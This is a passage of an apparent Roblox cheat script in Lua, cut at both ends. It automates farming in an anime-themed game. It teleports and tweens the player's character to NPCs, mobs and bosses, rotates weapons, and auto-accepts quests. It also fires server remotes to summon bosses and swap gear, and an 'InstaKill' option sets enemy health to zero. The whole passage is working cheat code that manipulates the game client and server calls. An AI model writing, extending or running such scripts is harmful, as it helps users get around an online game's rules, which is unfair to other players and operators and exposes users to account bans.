        if (n:find('Moveset') or n:find('Buyer')) and not n:find('Observation') then
            table.insert(Tables.NPC_MovesetList, n)
        end
        if (n:find('Mastery') or n:find('Questline') or n:find('Craft')) and not (n:find('Grail') or n:find('Slime')) then
            table.insert(Tables.NPC_MasteryList, n)
        end
    end

    table.sort(Tables.NPC_QuestList, function(a, b)
        local na = tonumber(a:match('%d+$')) or 0
        local nb = tonumber(b:match('%d+$')) or 0

        return na == nb and a < b or na < nb
    end)
    table.sort(Tables.NPC_MovesetList)
    table.sort(Tables.NPC_MasteryList)
end

UpdateNPCLists()
UpdateAllEntities()
PopulateNPCLists()

function SafeTeleportToNPC(targetName, customMap)
    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return
    end

    local actual = (customMap and customMap[targetName]) or targetName
    local target = workspace:FindFirstChild(actual) or PATH.InteractNPCs:FindFirstChild(actual)

    if not target then
        for _, v in pairs(PATH.InteractNPCs:GetChildren())do
            if v.Name:find(actual) then
                target = v

                break
            end
        end
    end
    if target then
        root.CFrame = target:GetPivot() * CFrame.new(0, 3, 0)
        root.AssemblyLinearVelocity = Vector3.zero
    else
        UI:Notify({
            Title = 'TP Failed',
            Description = 'NPC not found: ' .. tostring(actual),
            Duration = 3,
        })
    end
end
function HybridMove(targetCF)
    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return
    end

    local dist = (root.Position - targetCF.Position).Magnitude
    local speed = Options.TweenSpeed or 180

    if dist > (Options.TargetDistTP or 0) then
        local tweenTarget = targetCF * CFrame.new(0, 0, 150)
        local duration = (root.Position - tweenTarget.Position).Magnitude / speed
        local tw = TweenService:Create(root, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = tweenTarget})

        tw:Play()
        tw.Completed:Wait()
        task.wait(0.1)
    end

    root.CFrame = targetCF
    root.AssemblyLinearVelocity = Vector3.new(0, 0.01, 0)

    task.wait(0.2)
end
function GetWeaponsByType()
    local available = {}
    local enabledTypes = Options.SelectedWeaponType or {}
    local char = GetCharacter()
    local containers = {
        Plr.Backpack,
    }

    if char then
        table.insert(containers, char)
    end

    for _, container in ipairs(containers)do
        for _, tool in ipairs(container:GetChildren())do
            if tool:IsA('Tool') then
                local toolType = GetToolTypeFromModule(tool.Name)

                if enabledTypes[toolType] and not table.find(available, tool.Name) then
                    table.insert(available, tool.Name)
                end
            end
        end
    end

    return available
end
function UpdateWeaponRotation()
    local list = GetWeaponsByType()

    if #list == 0 then
        Shared.ActiveWeap = ''

        return
    end
    if #list == 1 then
        Shared.ActiveWeap = list[1]
        Shared.WeapRotationIdx = 1

        return
    end
    if Shared.WeapRotationIdx > #list then
        Shared.WeapRotationIdx = 1
    end

    local exists = false

    for _, n in ipairs(list)do
        if n == Shared.ActiveWeap then
            exists = true

            break
        end
    end

    if not exists then
        Shared.WeapRotationIdx = 1
        Shared.ActiveWeap = list[1]
        Shared.LastWRSwitch = tick()

        return
    end

    local delay = Options.SwitchWeaponCD or 4

    if tick() - Shared.LastWRSwitch >= delay then
        Shared.WeapRotationIdx = Shared.WeapRotationIdx + 1

        if Shared.WeapRotationIdx > #list then
            Shared.WeapRotationIdx = 1
        end

        Shared.ActiveWeap = list[Shared.WeapRotationIdx]
        Shared.LastWRSwitch = tick()
    end
end
function EquipWeapon()
    UpdateWeaponRotation()

    if Shared.ActiveWeap == '' then
        return
    end

    local char = GetCharacter()
    local hum = char and char:FindFirstChildOfClass('Humanoid')

    if not hum then
        return
    end
    if char:FindFirstChild(Shared.ActiveWeap) then
        return
    end

    local tool = Plr.Backpack:FindFirstChild(Shared.ActiveWeap)

    if not tool then
        Shared.ActiveWeap = ''

        return
    end

    local current = char:FindFirstChildOfClass('Tool')

    if current then
        hum:UnequipTools()
        task.wait(0.05)
    end

    local attempts = 0

    repeat
        hum:EquipTool(tool)
        task.wait(0.05)

        attempts = attempts + 1
    until char:FindFirstChild(Shared.ActiveWeap) or attempts >= 5
end
function CheckArmHaki()
    if Shared.ArmHaki then
        return true
    end

    local char = GetCharacter()

    if char then
        local la = char:FindFirstChild('Left Arm') or char:FindFirstChild('LeftUpperArm')
        local ra = char:FindFirstChild('Right Arm') or char:FindFirstChild('RightUpperArm')

        if (la and la:FindFirstChild('Lightning Strike')) or (ra and ra:FindFirstChild('Lightning Strike')) then
            Shared.ArmHaki = true

            return true
        end
    end

    return false
end
function IsSkillReady(key)
    local char = GetCharacter()
    local tool = char and char:FindFirstChildOfClass('Tool')

    if not tool then
        return true
    end

    local mainFrame = PGui:FindFirstChild('CooldownUI') and PGui.CooldownUI:FindFirstChild('MainFrame')

    if not mainFrame then
        return true
    end

    local cleanTool = Clean(tool.Name)

    for _, frame in pairs(mainFrame:GetChildren())do
        if not frame:IsA('Frame') then
            continue
        end

        local fname = frame.Name:lower()

        if fname:find('cooldown') and (fname:find(cleanTool) or fname:find('skill')) then
            local mapped = 'none'

            if fname:find('skill 1') or fname:find('_z') then
                mapped = 'Z'
            elseif fname:find('skill 2') or fname:find('_x') then
                mapped = 'X'
            elseif fname:find('skill 3') or fname:find('_c') then
                mapped = 'C'
            elseif fname:find('skill 4') or fname:find('_v') then
                mapped = 'V'
            elseif fname:find('skill 5') or fname:find('_f') then
                mapped = 'F'
            end
            if mapped == key then
                local lbl = frame:FindFirstChild('WeaponNameAndCooldown', true)

                return lbl and lbl.Text:find('Ready') or true
            end
        end
    end

    return true
end
function GetHumanoid(model)
    return model and model:FindFirstChildOfClass('Humanoid') or nil
end
function GetBossHP(model)
    if not model then
        return nil
    end

    return model:GetAttribute('_BossHP') or model:GetAttribute('BossHP')
end
function TryInstaKill(target)
    if not (Toggles.InstaKill and Toggles.InstaKill.Value) then
        return
    end

    local hum = GetHumanoid(target)

    if hum then
        pcall(function()
            hum.Health = 0
        end)
    end
end
function IsValidTarget(npc)
    if not npc or not npc.Parent then
        return false
    end

    local bossHP = GetBossHP(npc)

    if bossHP and tonumber(bossHP) and tonumber(bossHP) > 0 then
        return true
    end

    local hum = GetHumanoid(npc)

    if not hum then
        return false
    end
    if npc:FindFirstChild('IK_Active') then
        return true
    end

    local minMaxHP = tonumber(Options.InstaKillMinHP) or 0

    if Toggles.InstaKill and Toggles.InstaKill.Value then
        return hum.MaxHealth >= minMaxHP
    end

    local eligible = (Toggles.InstaKill and Toggles.InstaKill.Value) and hum.MaxHealth >= minMaxHP

    return eligible and (hum.Health > 0 or npc == Shared.Target) or hum.Health > 0
end
function GetBestMobCluster(nameDict)
    local all = {}

    if type(nameDict) ~= 'table' then
        return nil
    end

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        if npc:IsA('Model') and npc:FindFirstChildOfClass('Humanoid') then
            local clean = npc.Name:gsub('%d+$', '')

            if nameDict[clean] and IsValidTarget(npc) then
                table.insert(all, npc)
            end
        end
    end

    if #all == 0 then
        return nil
    end

    local best, maxNear = all[1], 0

    for _, a in ipairs(all)do
        local count = 0
        local posA = a:GetPivot().Position

        for _, b in ipairs(all)do
            if (posA - b:GetPivot().Position).Magnitude <= 35 then
                count = count + 1
            end
        end

        if count > maxNear then
            maxNear = count
            best = a
        end
    end

    return best, maxNear
end
function GetMobTarget()
    if not (Toggles.MobFarm and Toggles.MobFarm.Value) then
        Shared.MobIdx = 1

        return nil
    end

    local selected = Options.SelectedMob or {}
    local enabled = {}

    for mob, on in pairs(selected)do
        if on then
            table.insert(enabled, mob)
        end
    end

    table.sort(enabled)

    if #enabled == 0 then
        return nil
    end
    if Shared.MobIdx > #enabled then
        Shared.MobIdx = 1
    end

    local name = enabled[Shared.MobIdx]
    local target = GetBestMobCluster({[name] = true})

    if target then
        return target, GetNearestIsland(target:GetPivot().Position, target.Name), 'Mob'
    else
        Shared.MobIdx = Shared.MobIdx + 1

        return nil
    end
end
function GetAllMobTarget()
    if not (Toggles.AllMobFarm and Toggles.AllMobFarm.Value) then
        Shared.AllMobIdx = 1

        return nil
    end

    local list = {}

    for _, n in ipairs(Tables.MobList)do
        if n ~= 'TrainingDummy' then
            table.insert(list, n)
        end
    end

    if #list == 0 then
        return nil
    end
    if Shared.AllMobIdx > #list then
        Shared.AllMobIdx = 1
    end

    local startIdx = Shared.AllMobIdx
    local attempts = 0

    repeat
        local target = GetBestMobCluster({
            [list[Shared.AllMobIdx]] = true,
        })

        if target then
            local char = GetCharacter()
            local root = char and char:FindFirstChild('HumanoidRootPart')

            if root then
                local dist = (root.Position - target:GetPivot().Position).Magnitude
                local mobKey = list[Shared.AllMobIdx]

                if not Shared._AllMobLastDist then
                    Shared._AllMobLastDist = {}
                end
                if not Shared._AllMobStuckTick then
                    Shared._AllMobStuckTick = {}
                end

                local prevDist = Shared._AllMobLastDist[mobKey]
                local stuckSince = Shared._AllMobStuckTick[mobKey]

                if prevDist and math.abs(prevDist - dist) < 2 and dist > 20 then
                    if not stuckSince then
                        Shared._AllMobStuckTick[mobKey] = tick()
                    elseif tick() - stuckSince > 4 then
                        Shared._AllMobLastDist[mobKey] = nil
                        Shared._AllMobStuckTick[mobKey] = nil
                        Shared.AllMobIdx = Shared.AllMobIdx + 1

                        if Shared.AllMobIdx > #list then
                            Shared.AllMobIdx = 1
                        end

                        attempts = attempts + 1

                        continue
                    end
                else
                    Shared._AllMobLastDist[mobKey] = dist
                    Shared._AllMobStuckTick[mobKey] = nil
                end
            end

            return target, GetNearestIsland(target:GetPivot().Position), 'Mob'
        else
            Shared.AllMobIdx = Shared.AllMobIdx + 1

            if Shared.AllMobIdx > #list then
                Shared.AllMobIdx = 1
            end

            attempts = attempts + 1
        end
    until attempts >= #list

    return nil
end
function GetWorldBossTarget()
    if Toggles.AllBossesFarm and Toggles.AllBossesFarm.Value then
        for _, npc in pairs(PATH.Mobs:GetChildren())do
            if npc.Name:find('Boss') and not table.find(Tables.MiniBossList, npc.Name) and IsValidTarget(npc) then
                local island = 'Boss'

                for dName, iName in pairs(Shared.BossTIMap)do
                    if IsStrictBossMatch(npc.Name, dName) then
                        island = iName

                        break
                    end
                end

                return npc, island, 'Boss'
            end
        end
    end
    if Toggles.BossesFarm and Toggles.BossesFarm.Value then
        local selected = Options.SelectedBosses or {}

        for bossName, on in pairs(selected)do
            if on then
                for _, npc in pairs(PATH.Mobs:GetChildren())do
                    if IsStrictBossMatch(npc.Name, bossName) and not table.find(Tables.MiniBossList, npc.Name) and IsValidTarget(npc) then
                        return npc, Shared.BossTIMap[bossName] or 'Boss', 'Boss'
                    end
                end
            end
        end
    end

    return nil
end
function GetNearestMobTarget()
    if not (Toggles.NearestMobFarm and Toggles.NearestMobFarm.Value) then
        return nil
    end

    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return nil
    end

    local radius = Options.MobFarmRadius or 500
    local closest, minDist = nil, math.huge

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        if npc:IsA('Model') and npc:FindFirstChildOfClass('Humanoid') then
            if IsValidTarget(npc) then
                local npcRoot = npc:FindFirstChild('HumanoidRootPart')

                if npcRoot then
                    local dist = (root.Position - npcRoot.Position).Magnitude

                    if dist <= radius and dist < minDist then
                        closest = npc
                        minDist = dist
                    end
                end
            end
        end
    end

    if closest then
        return closest, GetNearestIsland(closest:GetPivot().Position), 'Mob'
    end

    return nil
end
function FireBossRemote(bossDisplayName, diff)
    local low = bossDisplayName:lower():gsub('%s+', '')

    table.clear(Shared.AltDamage)
    pcall(function()
        if low:find('rimuru') then
            Remotes.RimuruBoss:FireServer(diff)
        elseif low:find('anos') and not low:find('trueaizen') then
            Remotes.AnosBoss:FireServer('Anos', diff)
        elseif low:find('trueaizen') then
            if Remotes.TrueAizenBoss then
                Remotes.TrueAizenBoss:FireServer(diff)
            end
        elseif low:find('greatmage') then
            game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('RequestSpawnGreatMage'):FireServer('Normal')
        elseif low:find('strongest') then
            local arg = low:find('history') and 'StrongestHistory' or 'StrongestToday'

            Remotes.JJKSummonBoss:FireServer(arg, diff)
        else
            local summonId = SummonMap[bossDisplayName]

            if summonId then
                Remotes.SummonBoss:FireServer(summonId, diff)

                return
            end

            local internalId = bossDisplayName:gsub('%s+', '') .. 'Boss'

            if not _BossRemoteCache[internalId] then
                _BossRemoteCache[internalId] = FindRemoteDynamic('RequestSpawn' .. internalId) or FindRemoteDynamic('RequestSpawn' .. bossDisplayName:gsub('%s+', '')) or FindRemoteDynamic('RequestSpawn' .. bossDisplayName:gsub('%s+', '') .. 'Boss')
            end
            if _BossRemoteCache[internalId] then
                _BossRemoteCache[internalId]:FireServer(diff)
            else
                Remotes.SummonBoss:FireServer(internalId, diff)
            end
        end
    end)
end
function GetSummonTarget()
    if not (Toggles.SummonBossFarm and Toggles.SummonBossFarm.Value) then
        return nil
    end

    local selected = Options.SelectedSummon

    if not selected then
        return nil
    end

    local ls = selected:lower():gsub('%s+', '')

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        local n = npc.Name:lower():gsub('%s+', '')
        local match = false

        if ls:find('strongesthistory') or ls:find('strongestinhistory') then
            match = n:find('strongestinhistory') or n:find('strongesthistory')
        elseif ls:find('strongesttoday') or ls:find('strongestoftoday') then
            match = n:find('strongestoftoday') or n:find('strongesttoday')
        else
            local wName = SummonMap[selected] or (selected:gsub('%s+', '') .. 'Boss')

            match = n:find(wName:lower())
        end
        if match and IsValidTarget(npc) then
            return npc, GetNearestIsland(npc:GetPivot().Position, npc.Name), 'Boss'
        end
    end

    return nil
end
function GetOtherTarget()
    if not (Toggles.OtherSummonFarm and Toggles.OtherSummonFarm.Value) then
        return nil
    end

    local selected = Options.SelectedOtherSummon

    if not selected then
        return nil
    end

    local ls = selected:lower()

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        local n = npc.Name:lower()
        local match = ls:find('strongest') and n:find('strongest') and ((ls:find('history') and n:find('history')) or (ls:find('today') and n:find('today'))) or n:find(ls)

        if match and IsValidTarget(npc) then
            return npc, GetNearestIsland(npc:GetPivot().Position, npc.Name), 'Boss'
        end
    end

    return nil
end
function GetPityTarget()
    if not (Toggles.PityBossFarm and Toggles.PityBossFarm.Value) then
        return nil
    end

    local cur, max = GetCurrentPity()
    local useName = Options.SelectedUsePity

    if not useName then
        return nil
    end

    local buildBosses = Options.SelectedBuildPity or {}

    if cur >= (max - 1) then
        for _, npc in pairs(PATH.Mobs:GetChildren())do
            if IsStrictBossMatch(npc.Name, useName) and IsValidTarget(npc) then
                return npc, Shared.BossTIMap[useName] or 'Boss', 'Boss'
            end
        end
    else
        for bossName, on in pairs(buildBosses)do
            if on then
                for _, npc in pairs(PATH.Mobs:GetChildren())do
                    if IsStrictBossMatch(npc.Name, bossName) and IsValidTarget(npc) then
                        return npc, Shared.BossTIMap[bossName] or 'Boss', 'Boss'
                    end
                end
            end
        end
    end

    return nil
end
function GetBestQuestNPC()
    local playerLevel = Plr.Data.Level.Value
    local best, highestLevel = nil, -1

    if Modules.Quests and Modules.Quests.RepeatableQuests then
        for npcId, qData in pairs(Modules.Quests.RepeatableQuests)do
            local req = qData.recommendedLevel or 0

            if playerLevel >= req and req > highestLevel then
                highestLevel = req
                best = npcId
            end
        end
    end
    if not best then
        for _, v in ipairs(workspace.ServiceNPCs:GetChildren())do
            if v.Name:lower():find('quest') then
                best = v.Name

                break
            end
        end
    end

    return best or 'QuestNPC1'
end
function EnsureQuestSettings()
    local settings = PGui.SettingsUI.MainFrame.Frame.Content.SettingsTabFrame
    local t1 = settings:FindFirstChild('Toggle_EnableQuestRepeat', true)

    if t1 and t1.SettingsHolder.Off.Visible then
        Remotes.SettingsToggle:FireServer('EnableQuestRepeat', true)
        task.wait(0.3)
    end

    local t2 = settings:FindFirstChild('Toggle_AutoQuestRepeat', true)

    if t2 and t2.SettingsHolder.Off.Visible then
        Remotes.SettingsToggle:FireServer('AutoQuestRepeat', true)
    end
end
function UpdateQuest()
    if not (Toggles.LevelFarm and Toggles.LevelFarm.Value) then
        return
    end

    pcall(EnsureQuestSettings)

    local target = GetBestQuestNPC()
    local questUI = PGui:FindFirstChild('QuestUI')

    if not questUI then
        return
    end

    local questFrame = questUI:FindFirstChild('Quest')

    if not questFrame then
        return
    end

    local innerQuest = questFrame:FindFirstChild('Quest', true)
    local questVisible = innerQuest and innerQuest.Visible or questFrame.Visible

    if Shared.QuestNPC ~= target or not questVisible then
        Remotes.QuestAbandon:FireServer('repeatable')

        local t = 0

        while questVisible and t < 15 do
            task.wait(0.2)

            t = t + 1
            questVisible = innerQuest and innerQuest.Visible or questFrame.Visible
        end

        Remotes.QuestAccept:FireServer(target)

        t = 0

        while not questVisible and t < 20 do
            task.wait(0.2)

            t = t + 1
            questVisible = innerQuest and innerQuest.Visible or questFrame.Visible

            if t % 5 == 0 then
                Remotes.QuestAccept:FireServer(target)
            end
        end

        if questVisible then
            Shared.QuestNPC = target
        else
        end
    end
end
function GetLevelFarmTarget()
    if not (Toggles.LevelFarm and Toggles.LevelFarm.Value) then
        return nil
    end

    UpdateQuest()

    local questUI = PGui:FindFirstChild('QuestUI')
    local questFrame = questUI and questUI:FindFirstChild('Quest')
    local innerQuest = questFrame and questFrame:FindFirstChild('Quest', true)
    local questVisible = innerQuest and innerQuest.Visible or (questFrame and questFrame.Visible)

    if not questVisible then
        return nil
    end

    local qData = Modules.Quests and Modules.Quests.RepeatableQuests and Modules.Quests.RepeatableQuests[Shared.QuestNPC]
    local targetType = nil

    if qData and qData.requirements and qData.requirements[1] then
        targetType = qData.requirements[1].npcType
    end
    if not targetType then
        if questUI then
            for _, lbl in pairs(questUI:GetDescendants())do
                if lbl:IsA('TextLabel') and lbl.Text ~= '' then
                    local t = lbl.Text
                    local extracted = t:match('[Kk]ill%s+%d+%s+(%a+)') or t:match('[Dd]efeat%s+%d+%s+(%a+)') or t:match('[Kk]ill%s+(%a+)')

                    if extracted then
                        targetType = extracted

                        break
                    end
                end
            end
        end
    end
    if not targetType then
        return GetNearestMobTarget()
    end

    local matches = {}

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        if npc:IsA('Model') and npc:FindFirstChildOfClass('Humanoid') then
            if IsSmartMatch(npc.Name, targetType) then
                local clean = npc.Name:gsub('%d+$', '')

                matches[clean] = true
            end
        end
    end

    local best = GetBestMobCluster(matches)

    if best then
        return best, GetNearestIsland(best:GetPivot().Position, best.Name), 'Mob'
    end

    return GetNearestMobTarget()
end
function ShouldMainWait()
    if not (Toggles.AltBossFarm and Toggles.AltBossFarm.Value) then
        return false
    end

    for i = 1, 5 do
        local val = Options['SelectedAlt_' .. i]
        local name = (typeof(val) == 'Instance' and val:IsA('Player')) and val.Name or tostring(val)

        if name and name ~= '' and name ~= 'nil' and name ~= 'None' then
            if (Shared.AltDamage[name] or 0) < 10 then
                return true
            end
        end
    end

    return false
end
function GetAltHelpTarget()
    if not (Toggles.AltBossFarm and Toggles.AltBossFarm.Value) then
        return nil
    end

    local targetBoss = Options.SelectedAltBoss

    if not targetBoss then
        return nil
    end

    for _, npc in pairs(PATH.Mobs:GetChildren())do
        if IsStrictBossMatch(npc.Name, targetBoss) and IsValidTarget(npc) then
            Shared.AltActive = ShouldMainWait()

            return npc, Shared.BossTIMap[targetBoss] or 'Boss', 'Boss'
        end
    end

    FireBossRemote(targetBoss, Options.SelectedAltDiff or 'Normal')
    task.wait(0.5)

    return nil
end
function HandleSummons()
    if tick() - Shared.LastSummon < 2 then
        return
    end
    if Shared.MerchantBusy then
        return
    end
    if Toggles.PityBossFarm and Toggles.PityBossFarm.Value then
        local cur, max = GetCurrentPity()
        local useName = Options.SelectedUsePity
        local buildOpts = Options.SelectedBuildPity or {}

        if useName then
            if cur >= (max - 1) then
                if not IsBossAlreadySpawned(useName) and IsSummonable(useName) then
                    FireBossRemote(useName, Options.SelectedPityDiff or 'Normal')

                    Shared.LastSummon = tick()

                    task.wait(0.5)

                    return
                end
            else
                local anySpawned = false

                for bossName, on in pairs(buildOpts)do
                    if on and IsBossAlreadySpawned(bossName) then
                        anySpawned = true

                        break
                    end
                end

                if not anySpawned then
                    for bossName, on in pairs(buildOpts)do
                        if on and IsSummonable(bossName) then
                            FireBossRemote(bossName, 'Normal')

                            Shared.LastSummon = tick()

                            task.wait(0.5)

                            return
                        end
                    end
                end
            end
        end
    end
    if Toggles.AutoSummon and Toggles.AutoSummon.Value then
        local sel = Options.SelectedSummon

        if sel and not IsBossAlreadySpawned(sel) and IsSummonable(sel) then
            FireBossRemote(sel, Options.SelectedSummonDiff or 'Normal')

            Shared.LastSummon = tick()

            task.wait(0.5)
        end
    end
    if Toggles.AutoOtherSummon and Toggles.AutoOtherSummon.Value then
        local sel = Options.SelectedOtherSummon

        if sel then
            local ls = sel:lower():gsub('%s+', '')
            local found = false

            for _, npc in pairs(PATH.Mobs:GetChildren())do
                if npc.Name:lower():gsub('%s+', ''):find(ls) then
                    found = true

                    break
                end
            end

            if not found then
                FireBossRemote(sel, Options.SelectedOtherSummonDiff or 'Normal')

                Shared.LastSummon = tick()

                task.wait(0.5)
            end
        end
    end
end

local SeaBossKeywords = {
    'Sea Serpent',
    'Kraken',
    'kraken',
    'sea serpent',
    'SeaSerpent',
    'seaserpent',
    'Sea Beast',
    'SeaBeast',
    'seabeast',
}

function FindLiveByKeywords(keywords, includePathMobs, includeWorkspace, normalizeName)
    if not keywords then
        return nil
    end

    local function matches(name)
        if not name then
            return false
        end

        local source = normalizeName and name:lower():gsub('[%s_%-]', '') or name:lower()

        for _, keyword in ipairs(keywords)do
            local key = normalizeName and keyword:lower():gsub('[%s_%-]', '') or keyword:lower()

            if source:find(key, 1, true) then
                return true
            end
        end

        return false
    end

    if includePathMobs then
        for _, npc in pairs(PATH.Mobs:GetChildren())do
            if npc:IsA('Model') and IsValidTarget(npc) and matches(npc.Name) then
                return npc
            end
        end
    end
    if includeWorkspace then
        for _, obj in ipairs(workspace:GetDescendants())do
            if obj:IsA('Model') and IsValidTarget(obj) and matches(obj.Name) then
                return obj
            end
        end
    end

    return nil
end
function FindLiveBossAnywhere(keywords)
    return FindLiveByKeywords(keywords, false, true, false)
end

local PriorityNameMap = {
    ['Hunt Nearby Mobs'] = 'Nearest Mob',
    ['Quest Level Farm'] = 'Level Farm',
    ['Selected Mob Farm'] = 'Mob',
    ['Farm All Mobs'] = 'All Mob Farm',
    ['World Boss Farm'] = 'Boss',
    ['Pity System Boss'] = 'Pity Boss',
    ['Summon Boss Farm'] = 'Summon',
    ['Auto Merchant'] = 'Merchant',
    ['Sea Beast Farm'] = 'Sea Boss',
}

function CheckTask(taskName)
    local internalName = PriorityNameMap[taskName] or taskName

    if internalName == 'Merchant' then
        return (Toggles.AutoMerchant and Toggles.AutoMerchant.Value and Shared.MerchantBusy) and {
            true,
            nil,
            'None',
        } or nil
    elseif internalName == 'Pity Boss' then
        return GetPityTarget()
    elseif internalName == 'Summon' then
        return GetSummonTarget()
    elseif internalName == 'Boss' then
        return GetWorldBossTarget()
    elseif internalName == 'Level Farm' then
        return GetLevelFarmTarget()
    elseif internalName == 'All Mob Farm' then
        return GetAllMobTarget()
    elseif internalName == 'Mob' then
        return GetMobTarget()
    elseif internalName == 'Alt Help' then
        return GetAltHelpTarget()
    elseif internalName == 'Nearest Mob' then
        return GetNearestMobTarget()
    elseif internalName == 'Sea Boss' then
        if not (Toggles.AutoSeaBoss and Toggles.AutoSeaBoss.Value) then
            return nil
        end
        if not SeaBossKeywords then
            return nil
        end

        local boss = FindLiveBossAnywhere(SeaBossKeywords)

        if boss then
            return boss, GetNearestIsland(boss:GetPivot().Position), 'Boss'
        end

        return nil
    end

    return nil
end
function GetBestOwnedTitle(category)
    if #Tables.UnlockedTitle == 0 then
        return nil
    end

    local statMap = {
        ['Best EXP'] = 'XPPercent',
        ['Best Money & Gem'] = 'MoneyPercent',
        ['Best Luck'] = 'LuckPercent',
        ['Best DMG'] = 'DamagePercent',
    }
    local targetStat = statMap[category]

    if not targetStat then
        return nil
    end

    local bestId, highest = nil, -1

    for _, id in ipairs(Tables.UnlockedTitle)do
        local data = Modules.Title.Titles[id]

        if data and data.statBonuses and (data.statBonuses[targetStat] or 0) > highest then
            highest = data.statBonuses[targetStat]
            bestId = id
        end
    end

    return bestId
end
function UpdateSwitchState(target, farmType)
    if Shared.GlobalPrio == 'COMBO' then
        return
    end

    local types = {
        {
            id = 'Title',
            remote = Remotes.EquipTitle,
            method = function(v)
                return v
            end,
        },
        {
            id = 'Rune',
            remote = Remotes.EquipRune,
            method = function(v)
                return {
                    'Equip',
                    v,
                }
            end,
        },
        {
            id = 'Build',
            remote = Remotes.LoadoutLoad,
            method = function(v)
                return tonumber(v)
            end,
        },
        {
            id = 'Relic',
            remote = Remotes.EquipRelic,
            method = nil,
        },
    }

    for _, sw in ipairs(types)do
        local tog = Toggles['Auto' .. sw.id]

        if not (tog and tog.Value) then
            continue
        end
        if sw.id == 'Build' and tick() - Shared.LastBuildSwitch < 3.1 then
            continue
        end
        if sw.id == 'Relic' and tick() - (Shared.LastRelicSwitch or 0) < 3.1 then
            continue
        end

        local threshold = Options[sw.id .. '_BossHPAmt'] or 15
        local isLow = false

        if farmType == 'Boss' and target and target.Parent then
            local hum = target:FindFirstChildOfClass('Humanoid')
            local curHP, maxHP = 0, 0

            if hum and hum.MaxHealth > 0 then
                curHP = hum.Health
                maxHP = hum.MaxHealth
            end
            if maxHP <= 0 then
                local customMax = target:GetAttribute('MaxHP') or target:GetAttribute('_MaxHP') or target:GetAttribute('BossMaxHP') or target:GetAttribute('MaxHealth')
                local customCur = target:GetAttribute('_BossHP') or target:GetAttribute('BossHP') or target:GetAttribute('CurrentHP') or target:GetAttribute('Health')

                if customMax and tonumber(customMax) and tonumber(customMax) > 0 then
                    maxHP = tonumber(customMax)
                    curHP = tonumber(customCur) or maxHP
                else
                    maxHP = 1
                    curHP = 1
                end
            end
            if maxHP <= 0 then
                pcall(function()
                    local bar = PGui.BossUI.MainFrame.BossHPBar
                    local fill = bar:FindFirstChild('Bar') or bar:FindFirstChild('Fill') or bar:FindFirstChild('HPFill')

                    if fill and fill:IsA('Frame') then
                        curHP = fill.Size.X.Scale * 100
                        maxHP = 100
                    end
                end)
            end
            if maxHP > 0 then
                local hpPercent = (curHP / maxHP) * 100

                isLow = hpPercent <= threshold and hpPercent > 0
            end
        end

        local toEquip = ''

        if not farmType or farmType == 'None' then
            toEquip = Options['Default' .. sw.id] or ''
        elseif farmType == 'Mob' then
            toEquip = Options[sw.id .. '_Mob'] or ''

            if toEquip == '' or toEquip == 'None' then
                toEquip = Options['Default' .. sw.id] or ''
            end
        elseif farmType == 'Boss' then
            if isLow then
                toEquip = Options[sw.id .. '_BossHP'] or ''

                if toEquip == '' or toEquip == 'None' then
                    toEquip = Options[sw.id .. '_Boss'] or ''
                end
            else
                toEquip = Options[sw.id .. '_Boss'] or ''
            end
            if toEquip == '' or toEquip == 'None' then
                toEquip = Options['Default' .. sw.id] or ''
            end
        end
        if not toEquip or toEquip == '' or toEquip == 'None' then
            continue
        end

        local final = toEquip

        if sw.id == 'Title' and toEquip:find('Best ') then
            final = GetBestOwnedTitle(toEquip)

            if not final then
                continue
            end
        end

        local stateKey = sw.id .. '_' .. (farmType or 'None') .. '_' .. tostring(isLow)

        if final ~= Shared.LastSwitch[sw.id] or Shared['_LastFarmType_' .. sw.id] ~= stateKey then
            pcall(function()
                if sw.id == 'Relic' then
                    pcall(function()
                        Remotes.EquipRelic:FireServer('Unequip')
                    end)
                    task.wait(0.1)
                    pcall(function()
                        Remotes.EquipRelic:FireServer('Equip', final)
                    end)

                    Shared.LastRelicSwitch = tick()
                else
                    local args = sw.method(final)

                    if type(args) == 'table' then
                        sw.remote:FireServer(table.unpack(args))
                    else
                        sw.remote:FireServer(args)
                    end
                end
            end)

            Shared.LastSwitch[sw.id] = final
            Shared['_LastFarmType_' .. sw.id] = stateKey

            if sw.id == 'Build' then
                Shared.LastBuildSwitch = tick()
            end
        end
    end
end

local ActiveTween = nil
local LastMoveTime = 0
local TWEEN_COOLDOWN = 0.15

function ExecuteFarmLogic(target, island, farmType)
    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')
    local hum = char and char:FindFirstChildOfClass('Humanoid')

    if not char or not target or Shared.Recovering or not root or not hum then
        return
    end
    if Shared.MovingIsland then
        return
    end

    Shared.Target = target
    Shared.AltActive = (Toggles.AltBossFarm and Toggles.AltBossFarm.Value and farmType == 'Boss') and ShouldMainWait() or false

    if Toggles.IslandTP and Toggles.IslandTP.Value then
        if island and island ~= '' and island ~= 'Unknown' and island ~= Shared.Island then
            Shared.MovingIsland = true

            Remotes.TP_Portal:FireServer(island)
            task.wait(Options.IslandTPCD or 0.8)

            Shared.Island = island
            Shared.MovingIsland = false

            return
        end
    end

    local targetCF = target:GetPivot()
    local targetPos = targetCF.Position
    local dist = Options.Distance or 5
    local posType = Options.SelectedFarmType or 'Behind'
    local finalPos

    if Shared.AltActive then
        finalPos = targetPos + Vector3.new(0, 120, 0)
    elseif posType == 'Above' then
        finalPos = targetPos + Vector3.new(0, dist, 0)
    elseif posType == 'Below' then
        finalPos = targetPos + Vector3.new(0, -dist, 0)
    else
        finalPos = (targetCF * CFrame.new(0, 0, dist)).Position
    end

    local dest = CFrame.lookAt(finalPos, targetPos)
    local movementType = Options.SelectedMovementType or 'Tween'
    local distance = (root.Position - finalPos).Magnitude
    local DEAD_ZONE = 2.5

    if movementType == 'Teleport' then
        if distance > DEAD_ZONE then
            if ActiveTween then
                ActiveTween:Cancel()

                ActiveTween = nil
            end

            root.CFrame = dest
        end
    elseif movementType == 'Tween' then
        if distance > DEAD_ZONE and tick() - LastMoveTime > TWEEN_COOLDOWN then
            LastMoveTime = tick()

            if ActiveTween then
